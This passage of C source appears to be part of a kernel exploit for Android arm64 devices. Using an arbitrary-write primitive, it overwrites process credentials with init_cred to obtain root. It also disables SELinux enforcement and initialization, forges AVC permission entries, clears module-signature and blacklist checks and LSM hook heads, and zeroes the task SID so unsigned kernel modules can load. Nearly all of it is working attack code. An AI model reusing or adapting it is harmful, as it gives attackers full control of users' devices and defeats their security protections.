  for (int round = 0; round < g_opts.task_rounds; round++) {
    (void)perf_leak_task();
    if (perf_task_ncand) {
      break;
    }
    pr_warning("escalate: task leak round %d/%d missed\n", round + 1,
               g_opts.task_rounds);
  }
  if (!perf_task_ncand) {
    pr_warning("escalate: no task candidates leaked\n");
    return 0;
  }
  pr_info("escalate: probing %d candidate task(s), init_cred=%016llx uid=%d\n",
          perf_task_ncand, (unsigned long long)init_cred, (int)getuid());

  int rooted = 0;
  for (int i = 0; i < perf_task_ncand; i++) {
    uint64_t task = perf_task_cand[i];
    pr_info("escalate: candidate %d/%d task=%016llx (n=%u)\n", i + 1,
            perf_task_ncand, (unsigned long long)task, perf_task_cnt[i]);
    uint64_t comm_lo = 0;
    if (!slide_read8(task + SLIDE_TASK_COMM_OFF, &comm_lo) ||
        !slide_comm_matches(comm_lo, self_comm)) {
      pr_info("escalate: candidate %016llx rejected (comm=%016llx)\n",
              (unsigned long long)task, (unsigned long long)comm_lo);
      continue;
    }
    (void)prctl(PR_SET_NAME, self_comm, 0, 0, 0);
    pr_info("escalate: candidate %016llx confirmed (comm=%016llx)\n",
            (unsigned long long)task, (unsigned long long)comm_lo);
    struct write_test rc = {
      .name = "escalate-real_cred",
      .shape = SHAPE_POINTER,
      .value = init_cred,
      .target = task + SLIDE_TASK_REAL_CRED_OFF,
    };
    run_spec(&rc);
    if (geteuid() == 0 && getuid() == 0) {
      rooted = 1;
      break;
    }
    struct write_test c = {
      .name = "escalate-cred",
      .shape = SHAPE_POINTER,
      .value = init_cred,
      .target = task + SLIDE_TASK_CRED_OFF,
    };
    run_spec(&c);
    if (getuid() == 0 && geteuid() == 0) {
      rooted = 1;
      break;
    }
  }

  if (rooted) {
    /* The pointer writes stored `target` (a task address) at init_cred+8
       (gid); put the shared static cred back to pristine. */
    struct write_test z = {
      .name = "escalate-repair-gid",
      .shape = SHAPE_LEAF,
      .target = init_cred + 8,
    };
    run_spec(&z);
    pr_success("escalate: ROOT uid=%d euid=%d gid=%d init_cred=%016llx\n",
               (int)getuid(), (int)geteuid(), (int)getgid(),
               (unsigned long long)init_cred);
  } else {
    pr_warning("escalate: all candidates failed (uid=%d)\n", (int)getuid());
  }

  return rooted;
}

int slide_run_cred_only(void) {
  uint64_t init_cred = canon_addr(SLIDE_INIT_CRED_IMAGE);

  for (int round = 0; round < g_opts.task_rounds; round++) {
    (void)perf_leak_task();
    if (perf_task_ncand) {
      break;
    }
    pr_warning("cred-only: task leak round %d/%d missed\n", round + 1,
               g_opts.task_rounds);
  }
  if (!perf_task_ncand) {
    pr_warning("cred-only: no task candidates leaked\n");
    return 0;
  }

  if (perf_task_user_cand) {
    pr_info("cred-only: using get_user sp_el0 task=%016llx\n",
            (unsigned long long)perf_task_user_cand);
  }
  int attempts = perf_task_user_cand ? 1 : perf_task_ncand;
  for (int index = 0; index < attempts; index++) {
    uint64_t task = perf_task_user_cand ? perf_task_user_cand
                                        : perf_task_cand[index];

    struct write_test install = {
      .name = "cred-only-install",
      .shape = SHAPE_POINTER,
      .value = init_cred,
      .target = task + SLIDE_TASK_CRED_OFF,
    };
    if (!run_spec(&install)) {
      return 0;
    }

    char context[128] = "?";
    read_first_line("/proc/self/attr/current", context, sizeof(context));
    if (geteuid() == 0) {
      slide_root_cred = init_cred;
      pr_success("cred-only: EFFECTIVE ROOT uid=%d euid=%d ctx=%s\n",
                 (int)getuid(), (int)geteuid(), context);
      return 1;
    }
  }

  pr_warning("cred-only: failed\n");
  return 0;
}

/* Best-effort risk reduction for the multi-attempt flows: leaf-zero
 * panic_on_oops so a clobbered attempt cannot reboot the device (mrx-w09
 * does this first too).  Failure is not fatal; later attempts may retry. */
int slide_run_harden(void) {
  struct write_test z = {
    .name = "harden-panic-on-oops",
    .shape = SHAPE_LEAF,
    .target = canon_addr(SLIDE_PANIC_ON_OOPS_IMAGE),
  };
  int ok = run_spec(&z);
  if (ok) {
    pr_success("harden: panic_on_oops == 0\n");
  } else {
    pr_warning("harden: panic_on_oops write failed (continuing)\n");
  }
  return ok;
}

/*
 * Zero only selinux_state.enforcing.  The policy and SID tables stay fully
 * initialized, so this preserves framework behavior while allowing the root
 * broker to load a kernel module without replacing its credential blob.
 */
int slide_run_selinux_permissive(void) {
  struct write_test enforcing = {
    .name = "selinux-enforcing",
    .shape = SHAPE_LEAF,
    .target = canon_addr(SLIDE_SELINUX_STATE_IMAGE),
  };
  int ok = run_spec(&enforcing);
  if (ok) {
    pr_success("selinux: enforcing == 0\n");
  } else {
    pr_warning("selinux: enforcing write failed\n");
  }
  return ok;
}

int slide_run_module_sig_disable(void) {
  struct write_test signature = {
    .name = "module-signature-enforcement",
    .shape = SHAPE_LEAF,
    .target = canon_addr(SLIDE_SIG_ENFORCE_IMAGE),
  };
  int ok = run_spec(&signature);
  if (ok) {
    pr_success("module: sig_enforce == 0\n");
  } else {
    pr_warning("module: signature enforcement write failed\n");
  }
  return ok;
}

int slide_run_module_prep(void) {
  const struct {
    const char *name;
    uint64_t target;
  } writes[] = {
    {"module-sig-enforce",
     canon_addr(SLIDE_SIG_ENFORCE_IMAGE)},
    {"modules-disabled",
     canon_addr(SLIDE_MODULES_DISABLED_IMAGE)},
    {"module-blacklist",
     canon_addr(SLIDE_MODULE_BLACKLIST_IMAGE)},
  };
  for (size_t index = 0;
       index < sizeof(writes) / sizeof(writes[0]);
       index++) {
    struct write_test write = {
      .name = writes[index].name,
      .shape = SHAPE_LEAF,
      .target = writes[index].target,
    };
    if (!run_spec(&write)) {
      pr_warning("module-prep: %s failed\n", writes[index].name);
      return 0;
    }
  }

  pr_success("module-prep: signature and load-data policy checks cleared\n");
  return 1;
}

int slide_read_modules_disabled(uint32_t *value) {
  uint64_t raw = 0;
  if (!slide_read8(canon_addr(SLIDE_MODULES_DISABLED_IMAGE) - 4, &raw)) {
    pr_warning("module: modules_disabled read failed\n");
    return 0;
  }

  struct write_test clear_blacklist_tail = {
    .name = "module-clear-blacklist-after-read",
    .shape = SHAPE_LEAF,
    .target = canon_addr(SLIDE_MODULE_BLACKLIST_IMAGE),
  };
  if (!run_spec(&clear_blacklist_tail)) {
    pr_warning("module: failed to restore module_blacklist after read\n");
    return 0;
  }
  *value = (uint32_t)(raw >> 32);
  pr_info("module: modules_disabled=%u\n", *value);
  return 1;
}

int slide_set_current_init_user_ns(void) {
  if (!slide_root_cred) {
    pr_warning("user-ns: no current root credential\n");
    return 0;
  }

  const uint64_t init_user_ns = canon_addr(SLIDE_INIT_USER_NS_IMAGE);
  struct write_test install_user_ns = {
    .name = "user-ns-install-init-user-ns",
    .shape = SHAPE_POINTER,
    .value = init_user_ns,
    .target = slide_root_cred + SLIDE_CRED_USER_NS_OFF,
  };
  struct write_test clear_user_ns_tail = {
    .name = "user-ns-clear-user-ns-tail",
    .shape = SHAPE_LEAF,
    .target = init_user_ns + 8,
  };
  if (!run_spec(&install_user_ns) || !run_spec(&clear_user_ns_tail)) {
    pr_warning("user-ns: failed to install init_user_ns\n");
    return 0;
  }
  pr_success("user-ns: current cred now uses init_user_ns\n");
  return 1;
}

int slide_set_current_sid_zero(void) {
  if (!slide_root_cred) {
    pr_warning("current-sid: no current root credential\n");
    return 0;
  }

  uint64_t security = 0;
  if (!slide_read8(slide_root_cred + SLIDE_CRED_SECURITY_OFF, &security) ||
      security < 0xffffff8000000000ULL || (security & 7)) {
    pr_warning("current-sid: failed to read the live security blob pointer\n");
    return 0;
  }

  uint64_t ids = 0;
  if (!slide_read8(security, &ids)) {
    pr_warning("current-sid: failed to read the live task SID\n");
    return 0;
  }
  uint32_t old_osid = (uint32_t)ids;
  uint32_t old_sid = (uint32_t)(ids >> 32);

  /*
   * The leaf store covers sid and exec_sid.  Both may be discarded in this
   * short-lived loader process; the current task is recreated by late-load.
   */
  struct write_test clear_sid = {
    .name = "current-sid-zero",
    .shape = SHAPE_LEAF,
    .target = security + 4,
  };
  if (!run_spec(&clear_sid)) {
    pr_warning("current-sid: failed to clear task SID\n");
    return 0;
  }

  uint64_t verified_ids = 0;
  if (!slide_read8(security, &verified_ids) ||
      (uint32_t)(verified_ids >> 32) != 0) {
    pr_warning("current-sid: SID readback did not become zero\n");
    return 0;
  }

  pr_success("current-sid: security=%016llx osid=%u->%u sid=%u->0\n",
             (unsigned long long)security, old_osid,
             (uint32_t)verified_ids, old_sid);
  return 1;
}

int slide_run_selinux_uninit(void) {
  struct write_test uninit = {
    .name = "selinux-state-uninit",
    .shape = SHAPE_LEAF,
    .target = canon_addr(SLIDE_SELINUX_STATE_INITIALIZED_IMAGE),
  };
  if (!run_spec(&uninit)) {
    pr_warning("selinux: failed to enter temporary uninitialized window\n");
    return 0;
  }
  pr_success("selinux: temporary initialized=0\n");
  return 1;
}

int slide_restore_selinux_initialized(void) {
  struct write_test restore = {
    .name = "selinux-state-restore-initialized",
    .shape = SHAPE_POINTER,
    .value = canon_addr(SLIDE_DUMP_SKIP_ZERO_PAGE_IMAGE) + 1,
    .target = canon_addr(SLIDE_SELINUX_STATE_INITIALIZED_IMAGE),
  };
  if (!run_spec(&restore)) {
    pr_warning("selinux: failed to restore initialized=1\n");
    return 0;
  }
  pr_success("selinux: restored initialized=1\n");
  return 1;
}

int slide_avc_grant_module_permission(uint32_t sid, uint16_t tclass) {
  const uint64_t avc_base = canon_addr(SLIDE_SELINUX_AVC_IMAGE);
  const uint64_t slots_offset = 8;
  const uint64_t slot_size = 8;
  const uint64_t avc_slots = 512;
  const uint32_t bucket =
      (sid ^ (sid << 2) ^ ((uint32_t)tclass << 4)) & (avc_slots - 1);
  const uint64_t bucket_head = avc_base + slots_offset + bucket * slot_size;
  const uint64_t permission_mask = slide_capability_pattern();
  if (!permission_mask) {
    pr_warning("avc: no capability pattern for class %u\n", tclass);
    return 0;
  }
  uint64_t node = 0;
  if (!slide_read8(bucket_head, &node)) {
    pr_warning("avc: failed to read class %u bucket head\n", tclass);
    return 0;
  }

  /*
   * The read redirect places the boot_id data pointer at bucket_head+8.
   * Restore that adjacent bucket before touching the real AVC node.
   */
  struct write_test repair_next_bucket = {
    .name = "avc-repair-next-bucket",
    .shape = SHAPE_LEAF,
    .target = bucket_head + 8,
  };
  if (!run_spec(&repair_next_bucket)) {
    pr_warning("avc: failed to restore bucket %u tail\n", bucket + 1);
    return 0;
  }

  if (node < 0xffffff8000000000ULL || (node & 7)) {
    pr_warning("avc: class %u bucket has no real node (head=%016llx)\n",
               tclass, (unsigned long long)node);
    return 0;
  }

  struct write_test grant = {
    .name = "avc-real-node-grant",
    .shape = SHAPE_POINTER,
    .value = permission_mask,
    .target = node + 12,
  };
  if (!run_spec(&grant)) {
    pr_warning("avc: failed to grant class %u node permissions\n", tclass);
    return 0;
  }

  pr_success("avc: granted class %u through real node %016llx\n", tclass,
             (unsigned long long)node);
  return 1;
}

int slide_avc_clear_bucket(uint32_t sid, uint16_t tclass) {
  const uint64_t avc_base = canon_addr(SLIDE_SELINUX_AVC_IMAGE);
  const uint64_t bucket =
      (sid ^ (sid << 2) ^ ((uint32_t)tclass << 4)) & 511;
  const uint64_t bucket_head = avc_base + 8 + bucket * 8;
  struct write_test clear = {
    .name = "avc-clear-bucket",
    .shape = SHAPE_LEAF,
    .target = bucket_head,
  };
  if (!run_spec(&clear)) {
    pr_warning("avc: failed to clear bucket %llu\n",
               (unsigned long long)bucket);
    return 0;
  }
  pr_success("avc: cleared class %u bucket %llu\n", tclass,
             (unsigned long long)bucket);
  return 1;
}

int slide_run_module_ready(void) {
  const struct {
    const char *name;
    uint64_t target;
  } writes[] = {
    {"module-sig-enforce",
     canon_addr(SLIDE_SIG_ENFORCE_IMAGE)},
    {"capability-hook",
     canon_addr(SLIDE_SECURITY_HOOK_HEADS_IMAGE) +
         SLIDE_SECURITY_HOOK_CAPABLE_OFF},
    {"module-load-data-hook",
     canon_addr(SLIDE_SECURITY_HOOK_HEADS_IMAGE) +
         SLIDE_SECURITY_HOOK_LOAD_DATA_OFF},
  };

  for (size_t index = 0;
       index < sizeof(writes) / sizeof(writes[0]);
       index++) {
    struct write_test write = {
      .name = writes[index].name,
      .shape = SHAPE_LEAF,
      .target = writes[index].target,
    };
    if (!run_spec(&write)) {
      pr_warning("module-ready: %s failed\n", writes[index].name);
      return 0;
    }
  }
  pr_success("module-ready: signature, capability, and load hooks cleared\n");
  return 1;
}

static int slide_selinux_avc_entries(void) {
  char stats[256] = {0};
  int fd = open("/sys/fs/selinux/avc/hash_stats",
                O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return -1;
  }
  ssize_t length = read(fd, stats, sizeof(stats) - 1);
  close(fd);
  if (length <= 0) {
    return -1;
  }
  char *field = strstr(stats, "entries: ");
  if (!field) {
    return -1;
  }
  return atoi(field + strlen("entries: "));
}

static void slide_churn_selinux_avc(void) {
  const char *paths[] = {
    "/dev/null", "/dev/zero", "/dev/random", "/dev/urandom",
    "/dev/ptmx", "/dev/binder", "/dev/hwbinder", "/dev/vndbinder",
    "/dev/ashmem", "/dev/kmsg", "/dev/log", "/dev/socket",
    "/proc/kallsyms", "/proc/sys/kernel/random/boot_id",
    "/sys/fs/selinux/enforce", "/sys/fs/selinux/avc/hash_stats",
    "/system/bin/sh", "/system/bin/toybox", "/vendor/bin/sh",
    "/data/local/tmp", "/sdcard", "/mnt",
  };
  const int socket_cases[][2] = {
    {AF_UNIX, SOCK_STREAM}, {AF_UNIX, SOCK_DGRAM},
    {AF_INET, SOCK_STREAM}, {AF_INET, SOCK_DGRAM},
    {AF_INET6, SOCK_STREAM}, {AF_INET6, SOCK_DGRAM},
    {AF_NETLINK, SOCK_RAW}, {AF_PACKET, SOCK_RAW},
  };

  for (size_t index = 0; index < sizeof(paths) / sizeof(paths[0]); index++) {
    struct stat path_stat;
    (void)lstat(paths[index], &path_stat);
    int fd = open(paths[index], O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    if (fd >= 0) {
      close(fd);
    }
  }
  for (size_t index = 0;
       index < sizeof(socket_cases) / sizeof(socket_cases[0]); index++) {
    int fd = socket(socket_cases[index][0], socket_cases[index][1], 0);
    if (fd >= 0) {
      close(fd);
    }
  }
}

/* selinux_state.initialized @+2 makes security_compute_av() take the
 * allow-all path when zero.  A leaf write rounds its target down to a
 * four-byte boundary, so it cannot modify this byte.  Use the pointer shape
 * to store a page-aligned BSS address at selinux_state+2: both low bytes are
 * zero, which clears initialized through the leaf store's unaligned pair.
 * Do not write a guessed AVC address: this image does not export the GOT-W29
 * avc_cache_threshold singleton. */
int slide_run_selinux_relax(void) {
  struct write_test cache_threshold = {
    .name = "selinux-avc-threshold",
    .shape = SHAPE_LEAF,
    .target = canon_addr(SLIDE_AVC_CACHE_THRESHOLD_IMAGE),
  };
  if (!run_spec(&cache_threshold)) {
    pr_warning("selinux relax: AVC threshold write failed\n");
    return 0;
  }

  uint64_t zero_page = canon_addr(SLIDE_DUMP_SKIP_ZERO_PAGE_IMAGE);
  struct write_test init = {
    .name = "selinux-initialized-unaligned",
    .shape = SHAPE_POINTER,
    .value = zero_page,
    .target = canon_addr(SLIDE_SELINUX_STATE_INITIALIZED_IMAGE),
  };
  int ok = run_spec(&init);
  if (ok) {
    /* The pointer shape records its child address at value+8.  This lands
     * inside dump_skip()'s private zero buffer, which is zeroed again here
     * for the next core-dump user. */
    struct write_test cleanup = {
      .name = "selinux-zero-page-cleanup",
      .shape = SHAPE_LEAF,
      .target = zero_page + 8,
    };
    ok = run_spec(&cleanup);
  }
  if (ok) {
    /* AVC entries cached before initialized became zero still carry their
     * old denials.  The zero threshold makes each new distinct lookup evict
     * a batch of cached nodes; light background activity plus this read-only
     * churn drains the stale entries. */
    for (int round = 0; round < 8; round++) {
      slide_churn_selinux_avc();
      sleep(1);
      int entries = slide_selinux_avc_entries();
      if (entries >= 0 && entries <= 8) {
        pr_info("selinux relax: AVC entries=%d after %d second(s)\n",
                entries, round + 1);
        break;
      }
    }
  }
  if (ok) {
    pr_success("selinux relax PASSED (initialized=%016llx)\n",
               (unsigned long long)init.target);
  } else {
    pr_warning("selinux relax FAILED\n");
  }
  return ok;
}

int slide_run_poke_pointer(uint64_t target, uint64_t value) {
  struct write_test poke = {
    .name = "poke-pointer",
    .shape = SHAPE_POINTER,
    .value = value,
    .target = target,
  };
  return run_spec(&poke);
}

int slide_run_poke_zero(uint64_t target) {
  struct write_test poke = {
    .name = "poke-zero",
    .shape = SHAPE_LEAF,
    .target = target,
  };
  return run_spec(&poke);
}
